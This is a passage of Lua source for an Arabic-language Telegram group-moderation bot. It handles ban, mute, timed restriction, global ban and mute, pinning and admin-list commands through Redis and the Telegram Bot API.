function UnBanUser(extra,result,success)
if result.id_ then
DevBrAnD:srem(BrAnD..'BrAnD:Ban:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم الغاء حظره من المجموعه")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnBanUser)
end
if text and text:match('^الغاء حظر (%d+)') and ChCheck(msg) then
local user = text:match('الغاء حظر (%d+)')
DevBrAnD:srem(BrAnD..'BrAnD:Ban:'..msg.chat_id_, user)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = user, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,user,"reply","♰ ⌯ تم الغاء حظره من المجموعه")  
end 
end 
--     SoUrCe BrAnD     --
--          Mute          --
if Admin(msg) then
if text ==('كتم') and ChCheck(msg) then
function MuteReply(extra, result, success)
if not Constructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'♰ ⌯ لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع كتم ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if DevBrAnD:sismember(BrAnD..'BrAnD:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ هو بالفعل مكتوم من المجموعه")  
else
DevBrAnD:sadd(BrAnD..'BrAnD:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم كتمه من المجموعه")  
end 
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteReply)
end end
if text and text:match('^كتم @(.*)') and ChCheck(msg) then
local username = text:match('^كتم @(.*)')
function MuteUser(extra,result,success)
if not Constructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'♰ ⌯ لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع كتم ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
if DevBrAnD:sismember(BrAnD..'BrAnD:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"reply","♰ ⌯ هو بالفعل مكتوم من المجموعه")  
else
DevBrAnD:sadd(BrAnD..'BrAnD:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم كتمه من المجموعه")  
end
end
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteUser)
end
if text and text:match('^كتم (%d+)') and ChCheck(msg) then
local user = text:match('كتم (%d+)')
if not Constructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'♰ ⌯ لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع كتم ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
if DevBrAnD:sismember(BrAnD..'BrAnD:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"reply","♰ ⌯ هو بالفعل مكتوم من المجموعه")  
else
DevBrAnD:sadd(BrAnD..'BrAnD:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم كتمه من المجموعه")  
end
end
end
--     SoUrCe BrAnD     --
--         UnMute         --
local text = msg.content_.text_:gsub('الغاء الكتم','الغاء كتم')
if text ==('الغاء كتم') and ChCheck(msg) then
function UnMuteReply(extra, result, success)
if not DevBrAnD:sismember(BrAnD..'BrAnD:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ هو ليس مكتوم لالغاء كتمه")  
else
DevBrAnD:srem(BrAnD..'BrAnD:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم الغاء كتمه من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnMuteReply)
end end
if text and text:match('^الغاء كتم @(.*)') and ChCheck(msg) then
local username = text:match('^الغاء كتم @(.*)')
function UnMuteUser(extra,result,success)
if result.id_ then
if not DevBrAnD:sismember(BrAnD..'BrAnD:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"reply","♰ ⌯ هو ليس مكتوم لالغاء كتمه")  
else
DevBrAnD:srem(BrAnD..'BrAnD:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم الغاء كتمه من المجموعه")  
end
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnMuteUser)
end
if text and text:match('^الغاء كتم (%d+)') and ChCheck(msg) then
local user = text:match('الغاء كتم (%d+)')
if not DevBrAnD:sismember(BrAnD..'BrAnD:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"reply","♰ ⌯ هو ليس مكتوم لالغاء كتمه")  
else
DevBrAnD:srem(BrAnD..'BrAnD:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم الغاء كتمه من المجموعه")  
end
end 
end 
--     SoUrCe BrAnD     --
--          Tkeed           --
if Admin(msg) then
local text = msg.content_.text_:gsub('تقيد','تقييد')
if text ==('تقييد') and ChCheck(msg) then
function TkeedReply(extra, result, success)
if not Constructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'♰ ⌯ لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
DevBrAnD:sadd(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تقيده من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),TkeedReply)
end end
if text and text:match('^تقييد @(.*)') and ChCheck(msg) then
local username = text:match('^تقييد @(.*)')
function TkeedUser(extra,result,success)
if not Constructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'♰ ⌯ لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع تقيد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
DevBrAnD:sadd(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم تقيده من المجموعه")  
end
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,TkeedUser)
end
if text and text:match('^تقييد (%d+)') and ChCheck(msg) then
local user = text:match('تقييد (%d+)')
if not Constructor(msg) and DevBrAnD:get(BrAnD.."BrAnD:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'♰ ⌯ لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع تقيد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
DevBrAnD:sadd(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم تقيده من المجموعه")  
end
end
--     SoUrCe BrAnD     --
--         UnTkeed          --
local text = msg.content_.text_:gsub('الغاء تقيد','الغاء تقييد')
if text ==('الغاء تقييد') and ChCheck(msg) then
function UnTkeedReply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevBrAnD:srem(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم الغاء تقيده من المجموعه")  
end
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnTkeedReply)
end end
if text and text:match('^الغاء تقييد @(.*)') and ChCheck(msg) then
local username = text:match('^الغاء تقييد @(.*)')
function UnTkeedUser(extra,result,success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevBrAnD:srem(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم الغاء تقيده من المجموعه")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnTkeedUser)
end
if text and text:match('^الغاء تقييد (%d+)') and ChCheck(msg) then
local user = text:match('الغاء تقييد (%d+)')
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevBrAnD:srem(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم الغاء تقيده من المجموعه")  
end
end 
end
--     SoUrCe BrAnD     --
--         BanAll         --
if Sudo(msg) then
local text = msg.content_.text_:gsub('حضر عام','حظر عام')
if text ==('حظر عام') then
function BanAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(BrAnD) then  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevBrAnD:sadd(BrAnD..'BrAnD:BanAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم حظره عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanAllReply)
end end
if text and text:match('^حظر عام @(.*)') then
local username = text:match('^حظر عام @(.*)')
function BanAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(BrAnD) then  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevBrAnD:sadd(BrAnD..'BrAnD:BanAll:', result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم حظره عام من المجموعات")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanAllUser)
end
if text and text:match('^حظر عام (%d+)') then
local user = text:match('حظر عام (%d+)')
if tonumber(user) == tonumber(BrAnD) then  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(user) == true then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevBrAnD:sadd(BrAnD..'BrAnD:BanAll:', user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم حظره عام من المجموعات")  
end
--     SoUrCe BrAnD     --
--         MuteAll        --
if text ==('كتم عام') then
function MuteAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(BrAnD) then  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
DevBrAnD:sadd(BrAnD..'BrAnD:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم كتمه عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteAllReply)
end end
if text and text:match('^كتم عام @(.*)') then
local username = text:match('^كتم عام @(.*)')
function MuteAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(BrAnD) then  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if result.id_ then
DevBrAnD:sadd(BrAnD..'BrAnD:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم كتمه عام من المجموعات")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteAllUser)
end
if text and text:match('^كتم عام (%d+)') then
local user = text:match('كتم عام (%d+)')
if tonumber(user) == tonumber(BrAnD) then  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(user) == true then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ *لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
DevBrAnD:sadd(BrAnD..'BrAnD:MuteAll:', user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم كتمه عام من المجموعات")  
end
--     SoUrCe BrAnD     --
--         UnAll          --
local text = msg.content_.text_:gsub('الغاء العام','الغاء عام')
if text ==('الغاء عام') then
function UnAllReply(extra, result, success)
DevBrAnD:srem(BrAnD..'BrAnD:BanAll:', result.sender_user_id_)
DevBrAnD:srem(BrAnD..'BrAnD:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم الغاء (الحظر • الكتم) عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnAllReply)
end end
if text and text:match('^الغاء عام @(.*)') then
local username = text:match('^الغاء عام @(.*)')
function UnAllUser(extra,result,success)
if result.id_ then
DevBrAnD:srem(BrAnD..'BrAnD:BanAll:', result.id_)
DevBrAnD:srem(BrAnD..'BrAnD:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"reply","♰ ⌯ تم الغاء (الحظر • الكتم) عام من المجموعات")  
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnAllUser)
end
if text and text:match('^الغاء عام (%d+)') then
local user = text:match('الغاء عام (%d+)')
DevBrAnD:srem(BrAnD..'BrAnD:BanAll:', user)
DevBrAnD:srem(BrAnD..'BrAnD:MuteAll:', user)
ReplyStatus(msg,user,"reply","♰ ⌯ تم الغاء (الحظر • الكتم) عام من المجموعات")  
end
end
end
--     SoUrCe BrAnD     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not DevBrAnD:get(BrAnD..'BrAnD:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevBrAnD:sismember(BrAnD..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم رفعه في قائمة المطايه") 
DevBrAnD:sadd(BrAnD..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     SoUrCe BrAnD     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not DevBrAnD:get(BrAnD..'BrAnD:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevBrAnD:sismember(BrAnD..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ هو ليس مطي ليتم تنزيله") 
else
DevBrAnD:srem(BrAnD..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تنزيله من قائمة المطايه") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     SoUrCe BrAnD     --
if Admin(msg) then
if text and (text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')
local Minutes = string.gsub(mutept, 'm', '')
local num1 = tonumber(Minutes) * 60 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تقيده لمدة ↫ "..mutept.." د") 
DevBrAnD:sadd(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end
if text and (text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')
local hour = string.gsub(mutept, 'h', '')
local num1 = tonumber(hour) * 3600 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تقيده لمدة ↫ "..mutept.." س") 
DevBrAnD:sadd(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
if text and (text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')
local day = string.gsub(mutept, 'd', '')
local num1 = tonumber(day) * 86400 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"reply","♰ ⌯ تم تقيده لمدة ↫ "..mutept.." ي") 
DevBrAnD:sadd(BrAnD..'BrAnD:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
end 
--     SoUrCe BrAnD     --
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف رسائل (%d+)$")
DevBrAnD:set('BrAnDTEAM:'..BrAnD..'id:user'..msg.chat_id_,TXT)  
DevBrAnD:setex('BrAnDTEAM:'..BrAnD.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل عدد الرسائل الان \n♰ ⌯ ارسل الغاء لالغاء الامر ", 1, "md")
Dev_BrAnD(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function reply(extra, result, success)
DevBrAnD:del(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevBrAnD:incrby(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم اضافة "..Num..' رساله', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف نقاط (%d+)$")
DevBrAnD:set('BrAnDTEAM:'..BrAnD..'ids:user'..msg.chat_id_,TXT)  
DevBrAnD:setex('BrAnDTEAM:'..BrAnD.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل عدد النقاط الان \n♰ ⌯ ارسل الغاء لالغاء الامر ", 1, "md")
Dev_BrAnD(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف نقاط (%d+)$")
function reply(extra, result, success)
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
end
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ then if msg.reply_to_message_id_ ~= 0 then DevBrAnD:sadd(BrAnD.."BrAnD:cleaner"..msg.chat_id_, msg.id_) else DevBrAnD:sadd(BrAnD.."BrAnD:cleaner"..msg.chat_id_, msg.id_) end end end
if Manager(msg) and msg.reply_to_message_id_ ~= 0 then
if text and text:match("^تثبيت$") and ChCheck(msg) then 
if DevBrAnD:sismember(BrAnD.."BrAnD:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_BrAnD(msg.chat_id_,msg.id_, 1, "♰ ⌯ التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function ({ID = "PinChANnElMessage",ChANnEl_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
DevBrAnD:set(BrAnD..'BrAnD:PinnedMsg'..msg.chat_id_,msg.reply_to_message_id_)
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تثبيت الرساله بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
return false  
end
if data.code_ == 6 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ البوت ليس ادمن هنا !', 1, 'md')
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات', 1, 'md')
return false  
end
end,nil)
end 
end
--     SoUrCe BrAnD     --
if Admin(msg) then
if text == "المميزين" and ChCheck(msg) then 
local list = DevBrAnD:smembers(BrAnD..'BrAnD:VipMem:'..msg.chat_id_)
text = "♰ ⌯ قائمة المميزين ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "♰ ⌯ *لا يوجد مميزين*"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end 
--     SoUrCe BrAnD     --
if Manager(msg) then
if text == "الادمنيه" and ChCheck(msg) or text == "الادمنية" and ChCheck(msg) then 
local BrAnD =  'BrAnD:Admins:'..msg.chat_id_
local list = DevBrAnD:smembers(BrAnD..BrAnD)
text = "♰ ⌯ قائمة الادمنيه ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then
text = "♰ ⌯ *لا يوجد ادمنيه*"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end end
--     SoUrCe BrAnD     -- 
if Constructor(msg) then
if text == "المدراء" and ChCheck(msg) or text == "مدراء" and ChCheck(msg) then 
local list = DevBrAnD:smembers(BrAnD..'BrAnD:Managers:'..msg.chat_id_)
text = "♰ ⌯ قائمة المدراء ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
local username = DevBrAnD:get(BrAnD..'Save:UserName'..v)
if username then
text = text..""..k.."~ : [@"..username.."]\n"
else
text = text..""..k.."~ : `"..v.."`\n"
end end
if #list == 0 then 
text = "♰ ⌯ *لا يوجد مدراء*"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, text, 1, "md")
end 
if text == "المنظفين" and ChCheck(msg) then 
local list = DevBrAnD:smembers(BrAnD..'BrAnD:Cleaner:'..msg.chat_id_)
text = "♰ ⌯ قائمة المنظفين ↫ ⤈ \n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
